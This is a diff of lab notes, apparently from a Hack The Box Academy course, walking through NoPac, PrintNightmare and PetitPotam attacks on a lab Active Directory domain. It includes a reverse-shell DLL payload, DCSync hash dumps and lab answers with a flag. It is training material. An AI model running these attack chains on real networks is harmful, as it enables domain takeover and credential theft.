@@ -12,20 +12,20 @@ We can use this [tool](https://github.com/Ridter/noPac) to perform this attack.
 
 ### Ensuring Impacket is Installed
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ git clone https://github.com/SecureAuthCorp/impacket.git
 masterofblafu@htb[/htb]$ python setup.py install
 ```
 
 ### Cloning the NoPac Exploit Repo
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ git clone https://github.com/Ridter/noPac.git
 ```
 
 ### Scanning for NoPac
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap
 
 ███    ██  ██████  ██████   █████   ██████ 
@@ -43,7 +43,7 @@ We'll also notice the `ms-DS-MachineAccountQuota` number is set to `10`. In some
 
 ### Running NoPac & Getting a Shell
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
 
 ███    ██  ██████  ██████   █████   ██████ 
@@ -81,7 +81,7 @@ We will notice that a `semi-interactive shell session` is established with the t
 
 It is important to note that NoPac.py does save the TGT in the directory on the attack host where the exploit was run. We can use `ls` to confirm.
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ ls
 
 administrator_DC01.INLANEFREIGHT.local.ccache  noPac.py   requirements.txt  utils
@@ -92,7 +92,7 @@ We could then use the ccache file to perform a pass-the-ticket and perform furth
 
 ### Using noPac to DCSync the Built-in Administrator Account
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator
 
 ███    ██  ██████  ██████   █████   ██████ 
@@ -125,13 +125,13 @@ If Windows Defender (or another AV or EDR product) is enabled on a target, our s
 
 ### Cloning the Exploit
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ git clone https://github.com/cube0x0/CVE-2021-1675.git
 ```
 
 ### Install cube0x0's Version of Impacket
 
-```sh
+```shellsession
 pip3 uninstall impacket
 git clone https://github.com/cube0x0/impacket
 cd impacket
@@ -141,7 +141,7 @@ python3 ./setup.py install
 ### Enumerating for MS-RPRN
 We can use `rpcdump.py` to see if `Print System Asynchronous Protocol` and `Print System Remote Protocol` are exposed on the target.
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'
 
 Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol 
@@ -151,7 +151,7 @@ Protocol: [MS-RPRN]: Print System Remote Protocol
 ### Generating a DLL Payload
 After confirming this, we can proceed with attempting to use the exploit. We can begin by crafting a DLL payload using `msfvenom`.
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll
 
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -164,7 +164,7 @@ Final size of dll file: 8704 bytes
 ### Creating a Share with smbserver.py
 We will then host this payload in an SMB share we create on our attack host using `smbserver.py`.
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ sudo smbserver.py -smb2support CompData /path/to/backupscript.dll
 
 Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation
@@ -180,7 +180,7 @@ Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corpo
 ### Configuring & Starting MSF multi/handler
 Once the share is created and hosting our payload, we can use MSF to configure & start a multi handler responsible for catching the reverse shell that gets executed on the target.
 
-```sh
+```shellsession
 [msf](Jobs:0 Agents:0) >> use exploit/multi/handler
 [*] Using configured payload generic/shell_reverse_tcp
 [msf](Jobs:0 Agents:0) exploit(multi/handler) >> set PAYLOAD windows/x64/meterpreter/reverse_tcp
@@ -197,7 +197,7 @@ LPORT => 8080
 ### Running the Exploit
 With the share hosting our payload and our multi handler listening for a connection, we can attempt to run the exploit against the target. The command below is how we use the exploit:
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'
 
 [*] Connecting to ncacn_np:172.16.5.5[\PIPE\spoolss]
@@ -216,7 +216,7 @@ masterofblafu@htb[/htb]$ sudo python3 CVE-2021-1675.py inlanefreight.local/foren
 ### Getting the SYSTEM Shell
 Notice how at the end of the command, we include the path to the share hosting our payload (`\\<ip address of attack host>\ShareName\nameofpayload.dll`). If all goes well after running the exploit, the target will access the share and execute the payload. The payload will then call back to our multi handler giving us an elevated SYSTEM shell.
 
-```sh
+```shellsession
 [*] Sending stage (200262 bytes) to 172.16.5.5
 [*] Meterpreter session 1 opened (172.16.5.225:8080 -> 172.16.5.5:58048 ) at 2022-03-29 13:06:20 -0400
 
@@ -237,7 +237,7 @@ PetitPotam (CVE-2021-36942) is an LSA spoofing vulnerability that allows an unau
 ### Starting ntlmrelayx.py
 First off, we need to start `ntlmrelayx.py` in one window on our attack host, specifying the Web Enrollment URL for the CA host and using either the KerberosAuthentication or DomainController AD CS template. If we didn't know the location of the CA, we could use a tool such as [certi](https://github.com/zer1t0/certi) to attempt to locate it.
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController
 
 Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - 
@@ -279,7 +279,7 @@ In another window, we can run the tool [PetitPotam.py](https://github.com/topota
 
 There is an executable version of this tool that can be run from a Windows host. The authentication trigger has also been added to Mimikatz and can be run as follows using the encrypting file system (EFS) module: `misc::efs /server:<Domain Controller> /connect:<ATTACK HOST>`. There is also a PowerShell implementation of the tool `Invoke-PetitPotam.ps1`.
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ python3 PetitPotam.py 172.16.5.225 172.16.5.5       
                                                                                  
               ___            _        _      _        ___            _                     
@@ -308,7 +308,7 @@ Trying pipe lsarpc
 ### Catching Base64 Encoded Certificate for DC01
 Back in our other window, we will see a successful login request and obtain the base64 encoded certificate for the Domain Controller if the attack is successful.
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController
 
 Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation
@@ -361,7 +361,7 @@ MIIStQIBAzCCEn8GCSqGSIb3DQEHAaCCEnAEghJsMIISaDCCCJ8GCSqGSIb3DQEHBqCCCJAwggiMAgEA
 ### Requesting a TGT Using gettgtpkinit.py
 Next, we can take this base64 certificate and use `gettgtpkinit.py` to request a Ticket-Granting-Ticket (TGT) for the domain controller.
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 MIIStQIBAzCCEn8GCSqGSI...SNIP...CKBdGmY= dc01.ccache
 
 2022-04-05 15:56:33,239 minikerberos INFO     Loading certificate and key from file
@@ -379,14 +379,14 @@ INFO:minikerberos:Saved TGT to file
 ### Setting the KRB5CCNAME Environment Variable
 The TGT requested above was saved down to the `dc01.ccache` file, which we use to set the KRB5CCNAME environment variable, so our attack host uses this file for Kerberos authentication attempts.
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ export KRB5CCNAME=dc01.ccache
 ```
 
 ### Using Domain Controller TGT to DCSync
 We can then use this TGT with `secretsdump.py` to perform a DCSync and retrieve one or all of the NTLM password hashes for the domain.
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
 
 Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation
@@ -403,7 +403,7 @@ inlanefreight.local\administrator:des-cbc-md5:70add6e02f70321f
 
 We could also use a more straightforward command: `secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL` because the tool will retrieve the username from the ccache file. We can see this by typing `klist`:
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ klist
 
 Ticket cache: FILE:dc01.ccache
@@ -416,7 +416,7 @@ Valid starting       Expires              Service principal
 ### Confirming Admin Access to the Domain Controller
 Finally, we could use the NT hash for the built-in Administrator account to authenticate to the Domain Controller. From here, we have complete control over the domain and could look to establish persistence, search for sensitive data, look for other misconfigurations and vulnerabilities for our report, or begin enumerating trust relationships.
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ crackmapexec smb 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf
 
 SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
@@ -426,7 +426,7 @@ SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\admi
 ### Submitting a TGS Request for Ourselves Using getnthash.py
 We can also take an alternate route once we have the TGT for our target. Using the tool `getnthash.py` from PKINITtools we could request the NT hash for our target host/user by using Kerberos U2U to submit a TGS request with the [Privileged Attribute Certificate (PAC)](https://stealthbits.com/blog/what-is-the-kerberos-pac/) which contains the NT hash for the target. This can be decrypted with the AS-REP encryption key we obtained when requesting the TGT earlier.
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$
 
 Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation
@@ -440,7 +440,7 @@ Recovered NT Hash
 ### Using Domain Controller NTLM Hash to DCSync
 We can then use this hash to perform a DCSync with secretsdump.py using the `-hashes` flag.
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba
 
 Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation
@@ -458,7 +458,7 @@ inlanefreight.local\administrator:des-cbc-md5:70add6e02f70321f
 ### Requesting TGT and Performing PTT with DC01$ Machine Account
 Alternatively, once we obtain the base64 certificate via ntlmrelayx.py, we could use the certificate with the Rubeus tool on a Windows attack host to request a TGT ticket and perform a pass-the-ticket (PTT) attack all at once.
 
-```sh
+```shellsession
 PS C:\Tools> .\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /certificate:MIIStQIBAzC...SNIP...IkHS2vJ51Ry4= /ptt
 
    ______        _
@@ -521,7 +521,7 @@ PS C:\Tools> .\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /certificate:MIIStQIBAzC
 
 ### Confirming the Ticket is in Memory
 
-```sh
+```shellsession
 PS C:\Tools> klist
 
 Current LogonId is 0:0x4e56b
@@ -565,7 +565,7 @@ Cached Tickets: (3)
 ### Performing DCSync with Mimikatz
 Again, since Domain Controllers have replication privileges in the domain, we can use the pass-the-ticket to perform a DCSync attack using Mimikatz from our Windows attack host. Here, we grab the NT hash for the KRBTGT account, which could be used to create a Golden Ticket and establish persistence. We could obtain the NT hash for any privileged user using DCSync and move forward to the next phase of our assessment.
 
-```sh
+```shellsession
 PS C:\Tools> cd .\mimikatz\x64\
 PS C:\Tools\mimikatz\x64> .\mimikatz.exe
 
@@ -606,7 +606,7 @@ Authenticate to **10.129.47.229** (ACADEMY-EA-ATTACK01), with user `htb-student`
 1. Which two CVEs indicate NoPac.py may work? (Format: ####-#####&####-#####, no spaces) **Answer: 2021-42278&2021-42287**
 2. Apply what was taught in this section to gain a shell on DC01. Submit the contents of flag.txt located in the DailyTasks directory on the Administrator's desktop. **Answer: D0ntSl@ckonN0P@c!**
    - Use dynamic portforwarding with SSH and SOCKS to use the noPac tool from out attach host:
-        ```sh
+        ```shellsession
         $ tail -4 /etc/proxychains.conf
 
         # meanwile
@@ -615,7 +615,7 @@ Authenticate to **10.129.47.229** (ACADEMY-EA-ATTACK01), with user `htb-student`
         $ ssh -D 9050 htb-student@10.129.47.229
         ```
    - Scan to identify the vulnerability and run the tool to obtain a shell and read the flag:
-        ```sh
+        ```shellsession
         $ sudo proxychains python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap
         [proxychains] config file found: /etc/proxychains.conf
         [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
